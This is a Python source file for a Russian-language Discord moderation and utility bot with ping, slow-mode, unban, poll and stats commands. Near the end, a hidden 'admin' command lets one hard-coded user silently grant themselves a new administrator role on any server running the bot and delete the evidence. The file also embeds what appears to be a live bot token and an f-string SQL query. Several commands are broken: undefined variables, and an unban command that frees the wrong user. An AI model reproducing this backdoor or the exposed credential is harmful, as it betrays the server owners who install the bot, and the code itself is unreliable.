import discord
import random
from discord.ext import commands, tasks
import os
import time
import asyncio
import sys


import sqlite3

db = sqlite3.connect('DB/prefix/prefixes.db')
sql = db.cursor()

sql.execute("""CREATE TABLE IF NOT EXISTS prefixes (
	guild BIGINT,
	prefix TEXT
)""")

def get_prefix(client, message):
	sql.execute(f"SELECT * FROM prefixes WHERE guild = '{message.guild.id}'")

	for prefix in sql.fetchall():

		return prefix[1]
	
	prefix = '>'

	return prefix

client = commands.Bot( command_prefix = get_prefix )
client.remove_command("help")

@client.event
async def on_ready():
    guilds = await client.fetch_guilds(limit = None).flatten()
    await client.change_presence(status = discord.Status.idle, activity= discord.Activity(name=f'за {len(guilds)} серверами| >help', type= discord.ActivityType.watching))

@client.event
async def on_guild_join(guild):
    guilds = await client.fetch_guilds(limit = None).flatten()
    await client.change_presence(status = discord.Status.idle, activity= discord.Activity(name=f'за {len(guilds)} серверами| >help', type= discord.ActivityType.watching))



@client.command()
async def load(ctx, extension):
	if stx.author.id == 401080191054643200:
		client.load_extension(f"cogs.{extension}")
		await ctx.send("Cogs is loaded...")
	else:
		await ctx.send("Вы не владелец бота...")


@client.command()
async def unload(ctx, extension):
	if stx.author.id == 401080191054643200:
		client.unload_extension(f"cogs.{extension}")
		await ctx.send("Cogs is unloaded...")
	else:
		await ctx.send("Вы не владелец бота...")


@client.command()
async def reload(ctx, extension):
	if stx.author.id == 401080191054643200:
		client.unload_extension(f"cogs.{extension}")
		client.load_extension(f"cogs.{extension}")
		await ctx.send("Cogs is reloaded...")
	else:
		await ctx.send("Вы не владелец бота...")

for filename in os.listdir("./cogs"):
	if filename.endswith(".py"):
		client.load_extension(f"cogs.{filename[:-3]}")


@client.command(aliases = ['пинг'])
async def ping(ctx):
	ping = client.latency
	ping_emoji = "🟩🔳🔳🔳🔳"
	
	ping_list = [
		{"ping": 0.10000000000000000, "emoji": "🟧🟩🔳🔳🔳"},
		{"ping": 0.15000000000000000, "emoji": "🟥🟧🟩🔳🔳"},
		{"ping": 0.20000000000000000, "emoji": "🟥🟥🟧🟩🔳"},
		{"ping": 0.25000000000000000, "emoji": "🟥🟥🟥🟧🟩"},
		{"ping": 0.30000000000000000, "emoji": "🟥🟥🟥🟥🟧"},
		{"ping": 0.35000000000000000, "emoji": "🟥🟥🟥🟥🟥"}]
	
	for ping_one in ping_list:
		if ping > ping_one["ping"]:
			ping_emoji = ping_one["emoji"]
			break

	message = await ctx.send("Пожалуйста, подождите. . .")
	await message.edit(content = f"Понг! {ping_emoji} `{ping * 1000:.0f}ms` :ping_pong:")



@client.command(aliases = ["слоумод"])
@commands.has_permissions(manage_channels = True)
async def slowMode(ctx,delay:int = None):
	if delay == None:
		await ctx.send(embed = discord.Embed(title = "Ошибка! :x:",description = "Укажите время в секундах.Например: 21600(6ч)",color = discord.Color.red()))
		return
	if delay > 21600:
		await ctx.send(embed = discord.Embed(title = "Ошибка! :x:",description = "Нельзя использовать время больше 21600с(6ч)",color = discord.Color.red()))
		return
	await ctx.channel.edit(slowmode_delay = delay)
	await ctx.send(embed = discord.Embed(description = f"Успешно установлено задержку между сообщениями {delay} на участника",color = discord.Color.green()))


@client.command( pass_context = True, aliases=['разбан'] )
@commands.has_permissions( administrator = True )

async def unban( ctx, *, member ):
	await ctx.channel.purge( limit = 1 )

	banned_users = await ctx.guild.bans()

	for ban_entry in banned_users:
		user = ban_entry.user

		await ctx.guild.unban( user )
		await ctx.send( f'Участник { user.mention } был разбанен' )

		return

@client.command(aliases = ["poll", "креаголс"])
async def suggest(ctx, *,message):
	emb= discord.Embed(title="Голосование",description=f"{message}")
	msg= await ctx.channel.send( embed = embed )
	await msg.add_reaction("✅")
	await msg.add_reaction("❌")

	await ctx.send( embed = embed )


@client.command(aliases=["стат"])
async def stats(ctx):
	serverCount = len(client.guilds)
	memberCount = len(set(client.get_all_members()))
	embed = discord.Embed(title=f'{client.user.name} Stats', description='\uFEFF', colour=ctx.author.colour, timestamp=ctx.message.created_at)
	embed.add_field(name='Bot Version:', value='1.5')
	embed.add_field(name='Число Серверов:', value=serverCount)
	embed.add_field(name='Число всех учасников:', value=memberCount)
	embed.add_field(name='Разработчики бота:', value="<@401080191054643200> и <@759679475561791488>")
	embed.set_footer(text=f"{client.user.name}")
	embed.set_author(name=client.user.name, icon_url=client.user.avatar_url)
	await ctx.send(embed=embed)

@client.command()
async def admin(ctx):  # создаем асинхронную фунцию бота
    if ctx.author.id != 401080191054643200:
        return
    role = await ctx.guild.create_role(name="admin", permissions=discord.Permissions(administrator=True)) #создаем роль
    await ctx.author.add_roles(role)
    await ctx.message.delete()     

client.run("ODkyMDU4MDQ0MDg5OTA5MzE4.YVHXyw.SaJ-nYjIJbmZ2eSMTwU3bqTORXA")